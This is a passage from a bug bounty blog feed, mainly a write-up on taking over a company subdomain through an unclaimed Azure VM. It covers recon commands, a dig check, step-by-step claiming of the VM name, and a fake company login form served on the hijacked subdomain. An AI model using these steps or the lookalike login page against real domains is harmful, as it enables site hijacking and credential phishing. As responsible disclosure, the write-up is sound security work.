  &lt;li&gt;If you are struggling with an XSS trying to avoid a redirection, an auto-submit form… try to use the payload that we have seen in this post. As we saw, the focus through the hash in the URL is one of the first tasks that the browser performs when receiving a response, so it will be performed before tasks such as auto-submit form.&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Iván Santos Malpica&lt;br&gt;(Aka. HackCommander)</name><email>ivansantosmalpica.contact@gmail.com</email></author><category term="bug bounty" /><category term="web" /><category term="osint" /><category term="amass" /><category term="httpx" /><category term="gau" /><category term="kxss" /><category term="burpsuite" /><category term="xss" /><category term="bypass" /><summary type="html">Partial disclosure of a bug bounty report: defeating XSS filters using unexpected HTML attributes.</summary></entry><entry><title type="html">Subdomain takeover via unclaimed Azure VM</title><link href="https://hackcommander.github.io/posts/2023/11/13/subdomain-takeover-via-unclaimed-azure-vm/" rel="alternate" type="text/html" title="Subdomain takeover via unclaimed Azure VM" /><published>2023-11-13T00:00:00+01:00</published><updated>2023-11-13T00:00:00+01:00</updated><id>https://hackcommander.github.io/posts/2023/11/13/subdomain-takeover-via-unclaimed-azure-vm</id><content type="html" xml:base="https://hackcommander.github.io/posts/2023/11/13/subdomain-takeover-via-unclaimed-azure-vm/">&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-1&quot;&gt;1. Asset discovery&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-2&quot;&gt;2. Vulnerability discovery&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-3&quot;&gt;3. Vulnerability exploitation&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#section-id-3-1&quot;&gt;3.1. Steps of exploitation&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#section-id-3-2&quot;&gt;3.2. Why does this vulnerability exist?&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-4&quot;&gt;4. Report resolution&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-5&quot;&gt;5. Lessons learned&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/general/bug-bounty.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;:warning: &lt;span style=&quot;color:red&quot;&gt;This bug was reported in a private program in which it is not allowed to publish the vulnerabilities found. So this is a partial disclosure, only the essential technical details are exposed.&lt;/span&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;In this post I am going to show the first subdomain takeover (STO) I reported in a bug bounty program: subdomain takeover via unclaimed Azure VM. I was quite excited to find this vulnerability because, although it is almost always very easy to find and exploit, it is a very shocking vulnerability.&lt;/p&gt;

&lt;p&gt;Simplifying a lot, what an attacker gets by exploiting this vulnerability is to configure the web that he wants in the vulnerable subdomain. In this way, any user accessing that domain will not see the legitimate website of the company but will be seeing the website that the attacker has configured.&lt;/p&gt;

&lt;div id=&quot;section-id-1&quot; /&gt;

&lt;h2 id=&quot;1-asset-discovery&quot;&gt;1. Asset discovery&lt;/h2&gt;

&lt;p&gt;I found this asset through reconFTW on my VPS. &lt;a href=&quot;https://github.com/six2dez/reconftw&quot;&gt;ReconFTW&lt;/a&gt; is a recon tool to automate the entire process of reconnaissance for you. It outperforms the work of subdomain enumeration along with various vulnerability checks and obtaining maximum information about your target.&lt;/p&gt;

&lt;p&gt;The command that I used and that you can also use in your VPS is&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;nohup ~/reconftw/reconftw.sh -d example.com -r --deep -o ~/reconftw-output/ &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;~/nohup-history/nohup_1.log 2&amp;gt;&amp;amp;1 &amp;amp;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The meaning of each of the elements of the command is:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;nohup&lt;/strong&gt;: this command runs another command in the background and ensures it continues running even if the user logs out. This allows us to run a reconFTW execution and exit the VPS whenever we want without the process being terminated. If we did not use nohup, when we exit the SSH session on the VPS the process will end its execution.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;-d example.com&lt;/strong&gt;: specifies the target domain as &lt;em&gt;example.com&lt;/em&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;-r –deep&lt;/strong&gt;: performs &lt;a href=&quot;https://github.com/six2dez/reconftw#perform-full-recon-with-more-time-intense-tasks-vps-intended-only&quot;&gt;full recon with more time intense tasks (VPS intended only)&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;-o ~/reconftw-output/&lt;/strong&gt;: sets the output directory for the results of the reconftw.sh script to &lt;em&gt;~/reconftw-output/&lt;/em&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;&amp;gt; ~/nohup-history/nohup_1.log&lt;/strong&gt;: redirects standard output to the file &lt;em&gt;nohup_1.log&lt;/em&gt; in the directory &lt;em&gt;~/nohup-history/&lt;/em&gt;. This is useful to see how the execution is going at each moment. Simplifying, this file stores in each moment the reconFTW console output that we would see if we were executing reconFTW in the usual way (without nohup or in the background).&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;2&amp;gt;&amp;amp;1&lt;/strong&gt;: redirects standard error to the same location as standard output, ensuring both are captured in the log file.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;&amp;amp;&lt;/strong&gt;: runs the entire command in the background, allowing the user to continue using the VPS terminal for other tasks without waiting for the command to finish.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Depending on the number of subdomains, the execution of this command can take days to finish, so if you launch reconFTW in this mode it is highly recommended to do it from a VPS. After the execution finishes, the subdomains appear in the file &lt;em&gt;~/reconftw-output/example.com/subdomains/subdomains.txt&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Remember that if you want to have a VPS like mine you can rent it through my &lt;a href=&quot;https://blog.hackcommander.com/advertising/#section-id-1&quot;&gt;referral links&lt;/a&gt;! You’ll pay the same and you’ll be helping me!&lt;/p&gt;

&lt;div id=&quot;section-id-2&quot; /&gt;

&lt;h2 id=&quot;2-vulnerability-discovery&quot;&gt;2. Vulnerability discovery&lt;/h2&gt;

&lt;p&gt;I also found this vulnerability through reconFTW, specifically through the execution of nuclei that reconFTW performs on the subdomains that it finds. As you can see in the following capture&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2023-11-13-subdomain-takeover-via-unclaimed-azure-vm/nuclei-output.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;the nuclei findings are stored in the directory &lt;em&gt;/nuclei_output&lt;/em&gt;, divided into different txt files by criticality. Subdomain takeover is a high criticality vulnerability so they are stored in the high.txt file, and as you can see… I found 2 at the same time! These subdomains were the same except for some different letters at the end, something like &lt;em&gt;support.example.com&lt;/em&gt; and &lt;em&gt;support-e.example.com&lt;/em&gt;. They probably represented the same website but in different environments: PRE, QA, PRO…&lt;/p&gt;

&lt;p&gt;As this was my first subdomain takeover, I was looking for information on the internet to understand the vulnerability and see a PoC, and I found this post&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://godiego.co/posts/STO-Azure/&quot;&gt;Subdomain Takeover in Azure: making a PoC&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;which saved my life. Thanks to this post I could interpret the output of nuclei taking into account the lowest level subdomains:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Both Azure assets are VMs (virtual machines) due to the subdomain &lt;em&gt;cloudapp.azure.com&lt;/em&gt;.&lt;/li&gt;
  &lt;li&gt;Both machines are in Eastern North America due to the string &lt;em&gt;eastus&lt;/em&gt; of the highest subdomain.&lt;/li&gt;
  &lt;li&gt;Although they are in the same region, they are in different datacenters, since the highest subdomain of the first one is &lt;em&gt;eastus2&lt;/em&gt; (datacenter 2) and the second one is &lt;em&gt;eastus&lt;/em&gt; (we could say that it is datacenter 1).&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Both subdomains can be exploited in exactly the same way, so we will concentrate only on the first one.&lt;/p&gt;

&lt;p&gt;To check that the subdomain was really vulnerable I execute a command of the type&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;dig test.example.com
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and the result was&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2023-11-13-subdomain-takeover-via-unclaimed-azure-vm/dig-before-takeover.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, the status field has the value &lt;em&gt;NXDOMAIN&lt;/em&gt;, which means that the queried subdomain does not exist in the DNS. Specifically, &lt;em&gt;NXDOMAIN&lt;/em&gt; stands for &lt;em&gt;Non-Existent Domain&lt;/em&gt; and this status is returned when the DNS resolver cannot find any information, such as IP address or other records, for the specified subdomain. Also in &lt;em&gt;ANSWER SECTION&lt;/em&gt; and &lt;em&gt;AUTHORITY SECTION&lt;/em&gt; you can see how Azure appears and how the subdomain points to an &lt;em&gt;Azure CloudApp&lt;/em&gt; subdomain through the &lt;em&gt;CNAME&lt;/em&gt; record.&lt;/p&gt;

&lt;div id=&quot;section-id-3&quot; /&gt;

&lt;h2 id=&quot;3-vulnerability-exploitation&quot;&gt;3. Vulnerability exploitation&lt;/h2&gt;

&lt;div id=&quot;section-id-3-1&quot; /&gt;

&lt;h2 id=&quot;31-steps-of-exploitation&quot;&gt;3.1. Steps of exploitation&lt;/h2&gt;

&lt;p&gt;Exploitation of this vulnerability is very simple, especially being an Azure VM. Although you have all the information in the GoDiego’s post I mentioned before, I will detail the process step by step:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;Create an Azure account. At the beginning you will have a free subscription that will allow you to make your first subdomain takeovers for free.&lt;/p&gt;

    &lt;p&gt;&lt;a href=&quot;https://azure.microsoft.com/en-us/free/&quot;&gt;Create a free Azure account&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Log in and select the option &lt;em&gt;Virtual Machines&lt;/em&gt;.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/images/2023-11-13-subdomain-takeover-via-unclaimed-azure-vm/azure-home.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Select de option &lt;em&gt;Create&lt;/em&gt;.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/images/2023-11-13-subdomain-takeover-via-unclaimed-azure-vm/azure-create-vm.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Configure the machine as follows, but change the machine’s region to the one that corresponds in your case. In mine, as I said before, the region is &lt;em&gt;(US) East US 2&lt;/em&gt;.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/images/2023-11-13-subdomain-takeover-via-unclaimed-azure-vm/azure-vm-conf-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/images/2023-11-13-subdomain-takeover-via-unclaimed-azure-vm/azure-vm-conf-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Once you have created the machine, access the configuration and enter the name of the Azure subdomain associated with the takeover. If all goes well you will see something like the following&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/images/2023-11-13-subdomain-takeover-via-unclaimed-azure-vm/azure-vm-conf-3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;If not, you might get an error message like &lt;em&gt;The subdomain is already taken&lt;/em&gt; or similar. I was talking to other bug bounty hunters who even had automated detection and exploitation of this vulnerability and they told me that Azure introduced a mitigation to subdomain takeovers recently. This mitigation includes a delay after the expiration of the domain, so although it looks vulnerable in the dig query, it is not possible to perform the subdomain takeover until some time has passed. In my case, a month passed from detection to exploitation because I could not perform the subdomain takeover before.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;You must connect to the virtual machine via SSH using the assigned public IP and with the credentials you chose during configuration. This is necessary to store the HTML code you want to display on the vulnerable domain and to run the web service.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/images/2023-11-13-subdomain-takeover-via-unclaimed-azure-vm/azure-vm-connection.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;You will have to execute some commands like the following ones&lt;/p&gt;

    &lt;div class=&quot;code-header&quot;&gt;
   &lt;button class=&quot;copy-code-button&quot;&gt;
     Copy
   &lt;/button&gt;
&lt;/div&gt;
    &lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;ssh &amp;lt;your-username&amp;gt;&lt;/span&gt;@&amp;lt;your-public-azure-vm-ip&amp;gt;
&lt;span class=&quot;go&quot;&gt;mkdir www
cd /www
nano index.html
nohup sudo python3 -m http.server 80 &amp;amp;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;where during the execution of the command &lt;em&gt;nano&lt;/em&gt; you will have to write the HTML code you want.&lt;/p&gt;

    &lt;p&gt;In my case I used the following HTML code generated by ChatGPT&lt;/p&gt;

    &lt;div class=&quot;code-header&quot;&gt;
   &lt;button class=&quot;copy-code-button&quot;&gt;
     Copy
   &lt;/button&gt;
&lt;/div&gt;
    &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- Subdomain takeover by HackCommander at dd/mm/aaaa --&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;PUT THE NAME OF THE COMPANY HERE&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;style&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;body&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;nl&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Arial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sans-serif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
    &lt;span class=&quot;nc&quot;&gt;.container&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;nl&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;300px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;nl&quot;&gt;margin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;auto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;nl&quot;&gt;padding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;20px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;nl&quot;&gt;border&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1px&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;solid&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;#ccc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;nl&quot;&gt;border-radius&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;5px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
    &lt;span class=&quot;nt&quot;&gt;h2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;nl&quot;&gt;text-align&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;center&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
    &lt;span class=&quot;nc&quot;&gt;.form-group&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;nl&quot;&gt;margin-bottom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;15px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
    &lt;span class=&quot;nc&quot;&gt;.form-group&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;label&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;nl&quot;&gt;display&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;nl&quot;&gt;margin-bottom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;5px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
    &lt;span class=&quot;nc&quot;&gt;.form-group&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;nl&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;100%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;nl&quot;&gt;padding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;7px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;nl&quot;&gt;border&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1px&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;solid&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;#ccc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;nl&quot;&gt;border-radius&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;3px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
    &lt;span class=&quot;nc&quot;&gt;.form-group&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;button&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;nl&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;100%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;nl&quot;&gt;padding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;10px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;#4CAF50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;#fff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;nl&quot;&gt;border&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;none&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;nl&quot;&gt;border-radius&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;3px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;nl&quot;&gt;cursor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;pointer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
    &lt;span class=&quot;nc&quot;&gt;.form-group&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;button&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;:hover&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;#45a049&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/style&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;container&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;h2&amp;gt;&lt;/span&gt;PUT THE NAME OF THE COMPANY&apos;S PLATFORM HERE&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h2&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;form&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;form-group&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;label&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;for=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;username&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Username&lt;span class=&quot;nt&quot;&gt;&amp;lt;/label&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;username&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;username&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;placeholder=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter your username&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;form-group&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;label&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;for=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Password&lt;span class=&quot;nt&quot;&gt;&amp;lt;/label&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;placeholder=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter your password&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;form-group&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;button&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Login&lt;span class=&quot;nt&quot;&gt;&amp;lt;/button&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;I wanted to simulate a fake login form to increase the criticality of the report and “impact” the triager but the truth is that this is not necessary :satisfied:. It is enough that you use a simple HTML code in which you indicate your user of the platform in a comment in the code.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Finally, you can run the dig command again on the vulnerable subdomain&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/images/2023-11-13-subdomain-takeover-via-unclaimed-azure-vm/dig-after-takeover.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;and you will see how the subdomain already appears as taken and pointing to the IP of your virtual machine (region covered in green). Then by accessing the vulnerable subdomain you will see that the response is the one associated with the HTML code you coded in the Azure VM.&lt;/p&gt;

